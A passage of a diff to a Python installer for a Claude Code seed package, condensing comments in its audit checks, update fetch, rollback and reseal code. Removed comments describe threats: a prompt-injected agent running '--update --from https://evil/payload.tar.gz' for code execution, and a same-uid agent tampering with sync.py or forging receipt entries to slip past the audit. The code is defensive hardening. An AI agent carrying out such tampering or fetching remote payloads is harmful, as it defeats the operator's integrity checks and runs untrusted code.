+        # A refused or deferred skill has no project-scope link by design.
         checked_rel.add(f".claude/skills/{d['name']}")
     for d in receipt["install"].get("deferred_skills", []) or []:
-        # A deferred skill has no project-scope link BY DESIGN — don't let the
-        # unexpected-path sweep below report its absence as drift.
         checked_rel.add(f".claude/skills/{d['name']}")
 
     registered_skills = receipt["install"].get("registered_skills", [])
@@ -3072,9 +2503,7 @@ def _check_1(target: Path, package: Path, receipt: dict) -> dict:
         if reason:
             problems.append(f"{link_rel}: {reason}")
 
-    # Paths a shipped tool writes INTO at runtime, by design: the run log and
-    # (SEED-079) the brief store /freeze and /capture fill. Content there is
-    # the user's, produced by using the system — never "unexpected".
+    # Paths shipped tools write into at runtime (run log, brief store).
     runtime_writable_prefixes = RUNTIME_WRITABLE_PREFIXES
     pkg_paths = ({p.relative_to(package).as_posix() for c in written
                   for p in (package / c).rglob("*")} | set(ROOT_FILES)) if package else set()
@@ -3087,8 +2516,7 @@ def _check_1(target: Path, package: Path, receipt: dict) -> dict:
         if rel == CC_SEED_DIR or rel.startswith(CC_SEED_DIR + "/"):
             continue  # install.py's own receipt/staged scaffold
         if rel == "install.py" and package and (package / "install.py").is_file():
-            # The installer's own copy (older installs placed one; --update
-            # keeps it current via _refresh_installer). Compared, not skipped.
+            # The install's own installer copy: compared, not skipped.
             if live_p.read_bytes() != (package / "install.py").read_bytes():
                 problems.append("install.py: the install's own installer differs from the package's")
             continue
@@ -3098,25 +2526,19 @@ def _check_1(target: Path, package: Path, receipt: dict) -> dict:
         if rel == ".claude" and hook_record:
             continue
         if rel == ".claude/settings.json" and hook_record:
-            # SEED-080: settings.json is not shipped and is not baseline — it
-            # is the product of an approved gated write, and the receipt says
-            # so. Reporting it as UNEXPECTED taught the operator to ignore an
-            # UNEXPECTED line, which is the one line that must never become
-            # background noise. But the exemption is only earned by an ACTIVE
-            # record, and it is no longer a free pass: the entries are checked
-            # here, structurally, against that same record (2026-09-19).
+            # settings.json is the product of an approved gated write: exempt
+            # from UNEXPECTED only while that record is active, with its hooks
+            # checked structurally.
             if hook_record.get("written"):
                 problems.extend(_verify_hook_wiring(target, hook_record))
                 continue
-            # A REVOKED record grants nothing. The file is then just a file
-            # this package does not own; it falls through to the baseline
-            # comparison or to UNEXPECTED, as any other unmanaged path would.
+            # A revoked record falls through to the baseline/UNEXPECTED checks.
         if rel.split("/", 1)[0] in UPDATE_MANUAL_ONLY_COMPONENTS:
-            continue  # the operator's component (see the package loop above)
+            continue  # the operator's component
         if rel.rsplit("/", 1)[-1] == ".DS_Store":
-            continue  # macOS Finder metadata — appears in any folder a Mac user opens
+            continue  # macOS Finder metadata
         if "__pycache__" in rel.split("/") or rel.endswith((".pyc", ".pyo")):
-            continue  # bytecode cache — a harmless side effect of running any shipped .py tool
+            continue  # bytecode cache
         if any(rel == p.rstrip("/") or rel.startswith(p) for p in runtime_writable_prefixes):
             continue
         if any(rel == p.rstrip("/") or rel.startswith(p) for p in OPERATOR_OWNED_PREFIXES):
@@ -3131,11 +2553,7 @@ def _check_1(target: Path, package: Path, receipt: dict) -> dict:
         problems.append(f"{_escape_path(rel)}: UNEXPECTED — not shipped by the package, not in "
                          f"the pre-install baseline, not a declared runtime path")
 
-    # The sweep above walks what IS on disk, so a baseline path that has since
-    # been DELETED was never a subject of any check — a pre-existing operator
-    # note could be removed and check 1 still said PASS (2026-09-19, SEED-080
-    # review finding 5, executed as baseline_deletion_not_audited). Absence is
-    # a change to pre-existing content like any other.
+    # A baseline path that has since been deleted is a change too.
     for rel in sorted(baseline):
         if not os.path.lexists(str(target / rel)):
             problems.append(f"{_escape_path(rel)}: pre-existing path recorded in "
@@ -3153,16 +2571,8 @@ def _check_2(target: Path, package: Path) -> dict:
     sync = target / "scheduler" / "sync.py"
     if not sync.exists():
         return _flagged("2", "scheduler", ["scheduler/sync.py missing — can't verify"])
-    # Wave 2H-2 (F2 fix, 2026-08-06 Gemini review): this check used to exec
-    # the LIVE scheduler/sync.py to determine scheduler drift — but that
-    # script lives under --target, the same untrusted tree --audit exists
-    # to distrust. A same-uid agent could tamper with sync.py and have
-    # --audit itself execute the tampered code before any verdict is ever
-    # printed — check 1 would eventually flag the content diff, but only
-    # after the exec already happened. Verify byte-identity against the
-    # trusted --package copy first; only run it once it's provably the
-    # shipped bytes. A mismatch is flagged directly, with an explicit
-    # refusal, rather than silently trusting and running unknown code.
+    # sync.py lives under the untrusted --target: verify it is byte-identical
+    # to the package copy before executing it.
     pkg_sync = package / "scheduler" / "sync.py"
     if not pkg_sync.exists():
         return _error("2", "scheduler", ["package is missing scheduler/sync.py — can't verify"])
@@ -3192,9 +2602,7 @@ def _check_3(target: Path, receipt: dict) -> dict:
         return _pass("3", "CLAUDE.md region", "no CLAUDE.md and no approval on record")
 
     data = claude_md.read_bytes()
-    # P3: an approved cc-pack pointer region may sit before the cc-seed
-    # region (see _strip_pack_pointer_prefix) — invisible to everything
-    # below so check 3 keeps reasoning only about what IT owns.
+    # Skip an approved cc-pack pointer region so check 3 sees only its own.
     data = _strip_pack_pointer_prefix(data, receipt)
     s_marker, e_marker = MARKER_START.encode(), MARKER_END.encode()
     starts, ends = data.count(s_marker), data.count(e_marker)
@@ -3222,15 +2630,10 @@ def _check_3(target: Path, receipt: dict) -> dict:
         problems.append("unexpected content after the end marker (region must be the last thing in the file)")
     if baseline_entry:
         if baseline_entry.get("hash") is None:
-            pass  # too large to have been hashed at baseline time — can't verify
+            pass  # too large to hash at baseline — can't verify
         elif baseline_entry["hash"] == _sha256_bytes(b""):
-            # F5 fix (2026-08-06 Gemini review): a 0-byte pre-existing
-            # CLAUDE.md still gets a baseline entry (hash of b""), but
-            # _approve_claude_md's own `before = (existing + b"\n\n") if
-            # existing else b""` never prepends the "\n\n" separator to
-            # nothing — before is b"" here too, not b"\n\n". Mirror that
-            # branching instead of assuming every baseline implies a
-            # trailing separator, or a byte-perfect install false-flags.
+            # An empty pre-existing CLAUDE.md gets no "\n\n" separator
+            # (mirrors _approve_claude_md), so `before` must be empty.
             if before != b"":
                 problems.append("content outside the region does not match the pre-install baseline")
         elif not before.endswith(b"\n\n") or _sha256_bytes(before[:-2]) != baseline_entry["hash"]:
@@ -3246,18 +2649,10 @@ def _check_3(target: Path, receipt: dict) -> dict:
 
 
 def _check_4(target: Path, receipt: dict) -> dict:
-    """Checks the workspace's REAL Claude Code memory store (see
-    _mesh_store_dir — ~/.claude/projects/<slug>/memory/, not <ROOT>/memory/;
-    that correction was discovered live while testing this wave). Reduced
-    scope from the v2 spec's 'equals a pure re-application of the bootstrap
-    transform': verifies the approval is on record, MEMORY.md carries the
-    GENERATED header, and install.sh's own MEMORY.md.pre-mesh backup
-    byte-matches what --approve hashed immediately before running it — not
-    full transform equality (replaying fold.py's fold algorithm is real new
-    engineering, not built this wave — see docs/install-audit.md 'Explicit
-    residuals'). <ROOT>/memory/'s own pre-existing content, if any, is a
-    normal baseline-tracked path under check 1 — mesh-bootstrap never
-    touches it."""
+    """Check the workspace's real Claude Code memory store (_mesh_store_dir):
+    approval on record, MEMORY.md carries the GENERATED header, and
+    MEMORY.md.pre-mesh matches the hash --approve took before install.sh.
+    Not full fold-transform equality (see docs/install-audit.md residuals)."""
     gw = receipt.get("gated_writes", {}).get("mesh-bootstrap")
     if not gw or not gw.get("written"):
         return _pass("4", "mesh bootstrap", "declined — not run")
@@ -3290,14 +2685,8 @@ def _check_4(target: Path, receipt: dict) -> dict:
 
 
 def _check_5(target: Path) -> dict:
-    # v2 spec's check 5 wanted a dedicated `keyvault/migrate.py --check`
-    # mode detecting half-migration of the operator's real ~/.key. That's
-    # host-secret state entirely outside <ROOT>, and no such check-mode
-    # exists to call — real new engineering, deliberately not built this
-    # wave (see docs/install-audit.md's stated reduction). Shipped keyvault
-    # SCRIPTS are already covered by check 1's normal component integrity
-    # check; this is a documented placeholder so the report never silently
-    # claims coverage it doesn't have.
+    # Placeholder: live ~/.key migration state is outside <ROOT> and not
+    # audited; shipped keyvault scripts are covered by check 1.
     return _skipped("5", "keyvault migration state",
                      ["not implemented this wave — shipped script integrity is covered by check 1; "
                       "live ~/.key migration state is not audited — see docs/install-audit.md"])
@@ -3314,13 +2703,9 @@ def _check_6(target: Path) -> dict:
 
 
 def _check_7(target: Path, receipt: dict) -> dict:
-    """Wave 2H-2 (F1 fix, 2026-08-06 Gemini review): cross-check the live
-    receipt against the out-of-target anchor _save_receipt mirrors on every
-    write. A same-uid agent scoped to --target can edit receipt.json
-    directly (forging a baseline entry to launder a tampered file past
-    check 1, or forging a gated-write approval record) but can't also
-    rewrite the anchor, which lives outside --target. A divergence means
-    receipt.json was edited by something other than install.py itself."""
+    """Cross-check the live receipt against its out-of-target anchor. A
+    divergence means receipt.json was edited by something other than
+    install.py."""
     anchor = _load_anchor(target)
     if anchor is None:
         return _skipped("7", "receipt integrity",
@@ -3339,13 +2724,8 @@ def _check_7(target: Path, receipt: dict) -> dict:
 
 
 def _check_8(target: Path, receipt: dict) -> dict:
-    """P3: cross-checks the cc-pack pointer region (see the GATED_WRITES
-    comment) — same marker-counting idiom as check 3, but for a region that
-    must be at the START of the file rather than the end (cc-seed's region,
-    when present, stays the LAST thing in the file; packs are always written
-    before it). check 3 independently owns whatever follows this region,
-    including a cc-seed region if one exists — this check does not re-verify
-    that content, only its own."""
+    """Verify the cc-pack pointer region at the START of CLAUDE.md (check 3
+    owns whatever follows it)."""
     claude_md = target / "CLAUDE.md"
     gw = receipt.get("gated_writes", {}).get("import-pack-pointer")
     if not claude_md.exists():
@@ -3372,12 +2752,8 @@ def _check_8(target: Path, receipt: dict) -> dict:
                          ["pack pointer region is not at the start of the file — it must be "
                           "written first, before any other content"])
     if data[len(s_marker):len(s_marker) + 1] != b"\n":
-        # The byte immediately after the start marker is unconditionally
-        # skipped below when extracting `region` — if it's NOT the \n
-        # _write_packs_pointer always writes, that byte is invisible to the
-        # hash check that follows and could smuggle an unaudited byte into
-        # CLAUDE.md (2026-08-08 P3 review, GPT). Catch it explicitly rather
-        # than silently mis-slicing.
+        # The byte after the start marker is skipped when slicing `region`,
+        # so it must be the expected \n or it would escape the hash check.
         return _flagged("8", "cc-pack pointer region",
                          ["no newline immediately after the start marker — malformed region"])
 
@@ -3391,25 +2767,11 @@ def _check_8(target: Path, receipt: dict) -> dict:
 
 
 def _check_9(target: Path, receipt: dict) -> dict:
-    """P3: imported-pack content lives entirely outside --target (the
-    out-of-repo delivery root — see the GATED_WRITES comment), so check 1's
-    target.rglob walk never sees it. This is that check's counterpart for
-    the delivery root: every file install.py itself wrote during an
-    approved import must still hash-match what the receipt recorded at
-    approval time, and nothing extra may have appeared there since — the
-    same tamper story as check 1, scoped to where pack content actually
-    lives in this design.
-
-    Walks EVERY recorded path via _expected_pack_dest — the RE-DERIVED
-    location, never receipt['delivery_path'] (2026-08-08 P3 review, all
-    three reviewers independently: trusting delivery_path from a receipt a
-    same-uid agent can edit turns this check into an oracle that can be
-    pointed anywhere, including outside the delivery root entirely). Also
-    covers the two other things a pointer-based design needs auditing:
-    PACKS.md itself (the file literally imported into CLAUDE.md — was
-    outside audit coverage entirely before this fix) and orphaned pack
-    directories under packs/ that exist on disk but aren't in the receipt
-    at all (invisible to a per-recorded-pack walk)."""
+    """Audit imported-pack content in the out-of-repo delivery root (which
+    check 1 never walks): every recorded file still hash-matches, nothing
+    extra appeared, PACKS.md matches a fresh render, and no orphaned pack
+    directories exist. Paths are re-derived via _expected_pack_dest, never
+    taken from receipt['delivery_path']."""
     imported = receipt.get("imported_packs", {}) or {}
     delivery_root = _pack_delivery_root(target)
     problems = []
@@ -3463,10 +2825,7 @@ def _check_9(target: Path, receipt: dict) -> dict:
                     problems.append(f"{pid}/{rel}: present on disk but not recorded in the "
                                     f"receipt (possible tamper or manual edit)")
 
-    # PACKS.md is a pure function of receipt['imported_packs'] (_render_packs_md)
-    # and is the exact file the CLAUDE.md pointer resolves to — audit it by
-    # re-rendering from the (already-trusted-at-this-point) receipt and
-    # comparing bytes, rather than storing a separate hash to keep in sync.
+    # PACKS.md is a pure function of the receipt: re-render and compare bytes.
     packs_md = delivery_root / "PACKS.md"
     if imported or packs_md.exists():
         if packs_md.is_symlink():
@@ -3477,11 +2836,7 @@ def _check_9(target: Path, receipt: dict) -> dict:
             problems.append(f"PACKS.md: {packs_md} does not match what the current receipt "
                             f"would render — edited outside install.py, or stale")
 
-    # Orphaned pack directories: content that exists under packs/ but has no
-    # receipt entry at all — invisible to the per-recorded-pack loop above,
-    # e.g. left behind by a failed import that got partway through applying
-    # before a later step failed (see _approve_import_pack's cleanup, which
-    # only covers _apply_pack_generic's own exceptions).
+    # Orphaned pack directories: on disk under packs/ but not in the receipt.
     packs_dir = delivery_root / "packs"
     if packs_dir.is_dir() and not packs_dir.is_symlink():
         for child in sorted(packs_dir.iterdir()):
@@ -3515,14 +2870,9 @@ def _print_report(report):
 
 
 def _safe_check(fn, id_, name, *args):
-    """Runs a check function, converting an unexpected exception into an
-    ERROR result rather than crashing the whole --audit invocation. Scoped
-    to checks 8/9 (P3): both read imported_packs, a structure a same-uid
-    agent can shape adversarially via receipt tampering — the exact class
-    of hostile input pack_lib.verify_pack's own type-guards exist to
-    survive (2026-08-08 P3 review, GPT: 'one exception can abort the whole
-    audit instead of producing an ERROR check'). Checks 1-7 pre-date this
-    wrapper and are out of scope for this pass (see cc-pack/README.md)."""
+    """Run a check, converting an unexpected exception into an ERROR result.
+    Used for checks 8/9, which read receipt data an agent could shape
+    adversarially."""
     try:
         return fn(*args)
     except Exception as e:
@@ -3588,79 +2938,32 @@ def do_audit(target: Path, package: Path, as_json: bool) -> int:
     return exit_code
 
 
-# --- SEED-076: --update — let an existing install adopt later cc-seed content ---
-#
-# Every install() to date is a one-time snapshot: nothing in this file could
-# ever pull LATER cc-seed improvements onto an already-installed target.
-# Found 2026-08-15 auditing why a real install ({{REDACTED}}) was silently 29h
-# stale on a memory-mesh bugfix with no update path at all.
-#
-# Design reviewed by a 3-model panel (grok-4.6/gpt-5.6-terra/gemini-pro,
-# 2026-08-15) before any of this was written — every one of the choices
-# below is a direct response to a finding they raised, not a guess:
-#   - fetch is pinned to an IMMUTABLE git tag (never `main`/HEAD) — grok and
-#     openai both flagged "unsigned fetch of mutable main" as a straight
-#     regression against this file's own SHA256SUMS+signature bar elsewhere
-#     (the pack import path). Full detached-signature verification of a
-#     seed release is real, separate follow-on work (not done here — see
-#     BACKLOG.md SEED-076); this closes the worse half of that gap (mutable
-#     -> immutable) now.
-#   - `--from` accepts ONLY a local path or nothing (pinned default);
-#     arbitrary URLs are refused outright (Gemini: an agent whose context
-#     got prompt-injected with "--update --from https://evil/payload.tar.gz"
-#     would otherwise get a straight RCE, since scheduler/skills/_lib are
-#     executable content this installer writes unattended).
-#   - legacy installs with no recorded per-file "shipped" hash are NEVER
-#     assumed pristine (all three panelists independently: doing so would
-#     silently overwrite exactly the local customization this feature
-#     promises to protect). Bootstrapped from the exact historical commit
-#     recorded in receipt.json if resolvable; every existing path is
-#     reported SKIP (never silently touched) if it isn't.
-#   - detection is unconditional and free; writing anything requires
-#     `--apply` (mirrors --apply-proposal's own naming/shape rather than
-#     inventing a `--yes`), matching Principle 17 (show what you're
-#     approving) and this file's existing pattern for every other gated
-#     write.
-#   - tar extraction validates every member path stays under the
-#     destination before anything touches disk (path-traversal; Gemini
-#     named CVE-2007-4559 directly).
-#   - a target-scoped advisory lock serializes concurrent --update runs
-#     (does NOT yet serialize against --approve/--apply-proposal racing at
-#     the same time — named as a residual below, not silently dropped).
+# --- --update: let an existing install adopt later cc-seed content ---------
+#   - fetch is pinned to an immutable git tag, never a mutable branch.
+#   - `--from` accepts only a local path (or nothing, for the pinned
+#     default); URLs are refused, since the fetched content is executable.
+#   - installs with no recorded per-file "shipped" hash are never assumed
+#     pristine: bootstrap from the recorded historical commit if resolvable,
+#     otherwise report every existing path as SKIP.
+#   - detection is free; writing anything requires `--apply`.
+#   - tar extraction validates every member stays under the destination
+#     (path traversal) before anything touches disk.
+#   - a target-scoped lock serializes concurrent --update runs (not yet
+#     against --approve/--apply-proposal).
 
-# ONE literal ("owner/repo"), not two separate constants: install.py builds
-# URLs against multiple domains (github.com AND raw.githubusercontent.com),
-# so no existing scrub exception covers "{{REDACTED}}" split across an f-string.
-# Found live 2026-08-15 — a bare UPDATE_SOURCE_OWNER = "{{REDACTED}}" got scrubbed
-# to "{{REDACTED}}" in the shipped build (valid Python, so syntax_audit
-# passed clean; the URL just silently 404s at runtime). This exact literal
-# is now a build_seed.py PUBLIC_EXCEPTIONS entry, so it survives scrubbing
-# whole.
+# One "owner/repo" literal (URLs are built against several domains). It is a
+# build_seed.py PUBLIC_EXCEPTIONS entry so the build scrub leaves it intact;
+# splitting it would let the scrub corrupt the value.
 UPDATE_SOURCE_REPO_SLUG = "cvp1/ai-os-seed"
 UPDATE_SOURCE_OWNER, UPDATE_SOURCE_REPO = UPDATE_SOURCE_REPO_SLUG.split("/", 1)
-_UPDATE_MAX_BYTES = 50 * 1024 * 1024  # dist/ is a few MB; bound the fetch (Principle 8)
+_UPDATE_MAX_BYTES = 50 * 1024 * 1024  # bound the fetch
 _UPDATE_FETCH_TIMEOUT = 30
 SHIPPED_PATHS = COMPONENTS + ROOT_FILES  # the exact surface install() itself writes
-# Paths install() WRITES but does not simply copy verbatim — it mutates them
-# post-copy (scheduler/manifest.yml gets the operator's live job list
-# spliced in by _add_job/_install_default_jobs). Found live in this
-# session's own drill: a naive --update overwrite of manifest.yml replaced
-# the operator's scheduled repo_hygiene/freshness jobs with the empty
-# `jobs: []` the seed ships, which would have silently de-scheduled every
-# real job on the next update. --update reports these but NEVER auto-writes
-# them — reconciling scheduler entries stays a manual, by-hand act.
+# Paths install() mutates after copying (the manifest gets the live job
+# list). --update reports these but never auto-writes them.
 UPDATE_MANUAL_ONLY_PATHS = {"scheduler/manifest.yml", *OPERATOR_EDITABLE_CONFIG}
-# Whole COMPONENTS this file already treats as user-owned the moment real
-# content exists — install() itself never overwrites memory/ once it's
-# there (SATISFIED_BY_EXISTING, _memory_is_pristine): it ships an EMPTY
-# starter scaffold that becomes the operator's real, evolving, host-
-# specific memory the moment anything writes to it. Missed this in the
-# first version of --update and found it in the FIRST real dry run against
-# a real install ({{REDACTED}}): memory/MEMORY.md — Craig's actual live memory
-# index there — planned as [UPDATE], which would have overwritten it with
-# the empty scaffold on --apply. Caught by reading the dry-run plan before
-# ever passing --apply; excluded entirely, matching install()'s own
-# standing rule for this component rather than inventing a new one.
+# Components that become the operator's once they have content (memory/
+# starts as an empty scaffold). --update never writes them.
 UPDATE_MANUAL_ONLY_COMPONENTS = {"memory"}
 
 
@@ -3670,10 +2973,8 @@ def _update_lock_path(target: Path) -> Path:
 
 @contextlib.contextmanager
 def _update_lock(target: Path):
-    """O_EXCL advisory lock for the duration of one --update run. Only
-    serializes --update against itself; it does NOT yet serialize against
-    --approve / --apply-proposal running concurrently on the same target —
-    a named residual (BACKLOG.md SEED-076), not a silent gap."""
+    """O_EXCL advisory lock for one --update run. Serializes --update against
+    itself only, not against --approve / --apply-proposal."""
     p = _update_lock_path(target)
     p.parent.mkdir(parents=True, exist_ok=True)
     try:
@@ -3692,9 +2993,8 @@ def _update_lock(target: Path):
 
 
 def _fetch_url(url: str) -> bytes:
-    """GET url, bounded (Principle 8) and timed out. Raises RuntimeError
-    with a caller-facing message on any failure — never returns a partial
-    or unbounded body."""
+    """GET url with a size cap and timeout. Raises RuntimeError on any
+    failure; never returns a partial or unbounded body."""
     req = urllib.request.Request(url, headers={"User-Agent": "cc-seed-installer"})
     try:
         with urllib.request.urlopen(req, timeout=_UPDATE_FETCH_TIMEOUT) as r:
@@ -3709,15 +3009,9 @@ def _fetch_url(url: str) -> bytes:
 
 
 def _safe_extract_tar(data: bytes, dest: Path) -> Path:
-    """Extract a .tar.gz into dest, refusing any member whose resolved path
-    would land outside dest (path traversal / CVE-2007-4559 — Gemini's
-    finding) and any symlink/hardlink/device member outright (a seed
-    archive has no legitimate reason to ship one). Returns the single
-    top-level directory GitHub's archive wraps everything in — found
-    generically (exactly one top-level entry, and it must be a directory)
-    rather than assumed by name, because the naming GitHub picks for a
-    given ref is not itself something to trust guessing (grok's review:
-    "ambiguous root must fail, not guess")."""
+    """Extract a .tar.gz into dest, refusing any member that resolves outside
+    dest (path traversal) and any symlink/hardlink/device member. Returns the
+    single top-level directory; an ambiguous root fails rather than guessing."""
     dest.mkdir(parents=True, exist_ok=True)
     dest_r = dest.resolve()
     import io
@@ -3739,11 +3033,9 @@ def _safe_extract_tar(data: bytes, dest: Path) -> Path:
 
 
 def _version_key(v: str):
-    """Best-effort ordering for 'X.Y.Z[-suffix]' version strings: numeric
-    prefix compares first, and any pre-release suffix sorts BELOW the same
-    numeric prefix with no suffix (so 0.2.6-alpha < 0.2.6). Not full semver
-    (no suffix-vs-suffix ordering) — sufficient for refusing an accidental
-    downgrade, which is all this is used for."""
+    """Best-effort ordering for 'X.Y.Z[-suffix]': numeric prefix first, and a
+    pre-release suffix sorts below no suffix (0.2.6-alpha < 0.2.6). Only used
+    to refuse accidental downgrades."""
     m = re.match(r"^(\d+(?:\.\d+)*)(.*)$", v.strip())
     if not m:
         return ((), v)  # unparseable — sorts by raw string, never crashes
@@ -3753,10 +3045,8 @@ def _version_key(v: str):
 
 
 def _fetch_ref_tree(ref: str, tmp_parent: Path) -> Path:
-    """Fetch+extract an immutable ref (a tag OR a commit sha — GitHub's
-    archive endpoint accepts both identically) from the pinned source repo.
-    Never accepts a branch name — that's the one thing this function
-    exists to make impossible to pass in by accident."""
+    """Fetch and extract an immutable ref (tag or commit sha) from the pinned
+    source repo. Refuses branch names."""
     if ref in ("main", "master", "HEAD") or "/" in ref:
         raise RuntimeError(f"refusing to fetch update source by mutable/unsafe ref {ref!r}")
     url = (f"https://github.com/{UPDATE_SOURCE_OWNER}/{UPDATE_SOURCE_REPO}"
@@ -3769,14 +3059,9 @@ def _fetch_ref_tree(ref: str, tmp_parent: Path) -> Path:
 def _resolve_update_source(explicit_from: str, tmp_parent: Path):
     """Returns (tree: Path, version: str, source_desc: str).
 
-    `explicit_from`: a LOCAL PATH only (an operator-trusted seed clone/dist,
-    e.g. for offline use or testing) — never a URL. With no --from, the
-    pinned default: read VERSION off `main` (a small text read, not
-    executable content — the ACTUAL payload is never taken from main) then
-    fetch that exact version's tag archive, which IS immutable and content-
-    addressed. If that tag doesn't exist yet (e.g. the first publish after
-    this feature shipped, before publish.sh started tagging), this fails
-    with a clear message rather than silently falling back to main."""
+    `explicit_from` is a local path only, never a URL. Otherwise read VERSION
+    from `main` (text only) and fetch that version's immutable tag archive;
+    a missing tag fails clearly rather than falling back to main."""
     if explicit_from:
         tree = Path(explicit_from).expanduser().resolve()
         if not tree.is_dir():
@@ -3798,15 +3083,9 @@ def _resolve_update_source(explicit_from: str, tmp_parent: Path):
 
 def _shipped_snapshot(tree: Path, paths=None) -> dict:
     """{relpath: {"type": ..., "hash": "sha256:..."}} for every path under
-    `paths` (default SHIPPED_PATHS = the exact surface install() writes) in
-    `tree`. install() passes its own `written` list explicitly — a --into
-    compose install that SKIPPED a component (e.g. the user's own pre-
-    existing memory/) must never have that component snapshotted as
-    'shipped by us', or a future --update could offer to overwrite content
-    that was never ours. Symlinks are recorded by target, never followed;
-    over-cap files get hash=None (still enumerated, per the same
-    bound-the-loop-not-the-coverage discipline _capture_baseline already
-    uses)."""
+    `paths` (default SHIPPED_PATHS) in `tree`. install() passes its `written`
+    list so a skipped component is never recorded as shipped. Symlinks are
+    recorded, not followed; over-cap files get hash=None."""
     snap = {}
     for comp in (paths if paths is not None else SHIPPED_PATHS):
         root = tree / comp
@@ -3826,13 +3105,9 @@ def _shipped_snapshot(tree: Path, paths=None) -> dict:
 
 
 def _reconstruct_legacy_shipped(receipt: dict, tmp_parent: Path):
-    """For an install with no receipt["shipped"] yet (everything installed
-    before SEED-076): the only honest way to know what was ORIGINALLY
-    shipped at each path is to fetch that exact historical commit and
-    snapshot it — receipt["install"]["installer_commit"] already records
-    it. Returns a shipped-snapshot dict, or None if the commit is unknown
-    or can't be fetched (caller must then treat every existing path as
-    unknown/dirty — NEVER assume pristine; see the SEED-076 header note)."""
+    """For an install with no receipt["shipped"]: snapshot the historical
+    commit recorded in receipt["install"]["installer_commit"]. Returns None if
+    unknown or unfetchable (the caller then treats every path as dirty)."""
     commit = (receipt.get("install") or {}).get("installer_commit")
     if not commit or commit == "unknown":
         return None
@@ -3850,19 +3125,16 @@ def _is_update_manual_only(rel: str) -> bool:
 
 
 def _plan_update(target: Path, shipped_now: dict, new_tree: Path):
-    """Three-way plan: for every path the NEW tree would ship, decide
-    create / update / skip_dirty / manual_only / unchanged. `shipped_now` is
-    the reference "what did we last know we shipped here" snapshot — either
-    receipt["shipped"] (normal case) or a freshly-reconstructed one
-    (legacy bootstrap) or {} (no history at all -> everything existing is
-    dirty by definition, nothing to compare against)."""
+    """Three-way plan for every path the new tree ships: create / update /
+    skip_dirty / manual_only / unchanged. `shipped_now` is what we last
+    shipped here (receipt["shipped"], a legacy reconstruction, or {})."""
     plan = {"create": [], "update": [], "skip_dirty": [], "manual_only": [], "unchanged": []}
     new_snap = _shipped_snapshot(new_tree)
     for rel, new_entry in sorted(new_snap.items()):
         live = target / rel
         if not live.exists() and not live.is_symlink():
             if _is_update_manual_only(rel):
-                continue  # doesn't exist yet -> nothing install() would have synthesized either
+                continue  # absent and manual-only: nothing to create
             plan["create"].append(rel)
             continue
         if _is_update_manual_only(rel):
@@ -3887,12 +3159,8 @@ def _plan_update(target: Path, shipped_now: dict, new_tree: Path):
 
 
 def _apply_update(target: Path, receipt: dict, new_tree: Path, plan: dict, new_snap: dict):
-    """Copy every create/update-planned path in, then refresh
-    receipt["shipped"] for exactly the paths just written — never for
-    skip_dirty paths (those keep whatever shipped record they already had,
-    so a future run keeps comparing them against the SAME historical
-    reference rather than the new one they were never actually updated
-    to)."""
+    """Copy every create/update path in, then refresh receipt["shipped"] for
+    those paths (and unchanged ones). skip_dirty paths keep their old record."""
     for rel in plan["create"] + plan["update"]:
         src = new_tree / rel
         dst = target / rel
@@ -3910,25 +3178,18 @@ def _apply_update(target: Path, receipt: dict, new_tree: Path, plan: dict, new_s
                 dst.unlink()
             shutil.copy2(src, dst)
     shipped = dict(receipt.get("shipped") or {})
-    # "unchanged" means the live bytes ALREADY equal the new package's, so the
-    # new entry is what is shipped there now. Keeping the old version's record
-    # made such a path look locally modified on every later --update (found
-    # repairing {{REDACTED}}, 2026-09-26).
+    # "unchanged" paths already equal the new package, so record the new entry.
     for rel in plan["create"] + plan["update"] + plan["unchanged"]:
         shipped[rel] = new_snap[rel]
     receipt["shipped"] = shipped
 
 
-# --- --rollback: undo the most recent --update --apply, byte for byte ---
-#
-# {{REDACTED}} became the beta channel (2026-09-26): betas land there first via
-# --update --from <dist>, soak, and only then publish. A beta that breaks the
-# operator's daily driver needs a one-command way back, and --update cannot
-# be it: it refuses downgrades, needs the OLD dist on hand, and never deletes
-# a path the new version created. So every --update --apply now saves exactly
-# what it is about to replace, and --rollback puts it back.
+# --- --rollback: undo the most recent --update --apply, byte for byte -------
+# --update can't serve as the way back (it refuses downgrades and never
+# deletes paths it created), so every --update --apply saves what it is about
+# to replace and --rollback restores it.
 ROLLBACK_DIR = "rollback"
-ROLLBACK_KEEP = 3  # bounded (Principle 8): only the last few updates are undoable
+ROLLBACK_KEEP = 3  # only the last few updates are undoable
 
 
 def _rollback_root(target: Path) -> Path:
@@ -3936,9 +3197,8 @@ def _rollback_root(target: Path) -> Path:
 
 
 def _rollback_points(target: Path, include_used: bool = False) -> list:
-    """Saved points, oldest first. A used point is renamed *.rolled-back and
-    is never offered again — undoing the same update twice would restore
-    stale bytes over whatever came after."""
+    """Saved points, oldest first. Used points (*.rolled-back) are never
+    offered again."""
     root = _rollback_root(target)
     if not root.is_dir():
         return []
@@ -3949,10 +3209,9 @@ def _rollback_points(target: Path, include_used: bool = False) -> list:
 
 def _snapshot_for_rollback(target: Path, plan: dict, new_snap: dict,
                            from_version, to_version) -> Path:
-    """Save what the coming _apply_update will overwrite, BEFORE it runs.
-    Updated paths keep their prior bytes; created paths are recorded with the
-    hash the update will give them, so rollback can tell "still as the update
-    left it" (safe to remove) from "edited since" (left alone, reported)."""
+    """Save what _apply_update will overwrite, before it runs. Created paths
+    are recorded with their new hash so rollback can tell "as the update left
+    it" (removable) from "edited since" (left alone)."""
     snap = _rollback_root(target) / datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%S%fZ")
     files = snap / "files"
     files.mkdir(parents=True)
@@ -3996,10 +3255,8 @@ def _still_as_updated(live: Path, new_entry: dict) -> bool:
 
 
 def do_rollback(target: Path, assume_yes: bool) -> int:
-    """Undo the most recent --update --apply. Shows every path it will
-    restore or remove and needs a typed yes (Principle 17). A path edited
-    since the update is never touched — rollback restores the update's own
-    footprint, not the operator's later work."""
+    """Undo the most recent --update --apply after showing every path and
+    getting a typed yes. Paths edited since the update are never touched."""
     snaps = _rollback_points(target)
     if not snaps:
         return die(f"{target}: no rollback point — only an --update --apply made by an "
@@ -4067,19 +3324,10 @@ def do_rollback(target: Path, assume_yes: bool) -> int:
 def do_reseal(target: Path, assume_yes: bool) -> int:
     """Re-record installed_sha as the operator-approved baseline.
 
-    The missing counterpart to "never re-baseline silently". installed_sha is
-    refreshed only by install and update, precisely so an --audit or --approve
-    run cannot launder a tampered tree. The cost, unnoticed until 2026-09-19:
-    an install that diverges for a GOOD reason — a component kept as a git
-    checkout, a file the operator patched for their platform, or a change in
-    what the hash counts — can never be clean again, and M0-package-integrity
-    stays red forever. A permanently red integrity check is not a safety
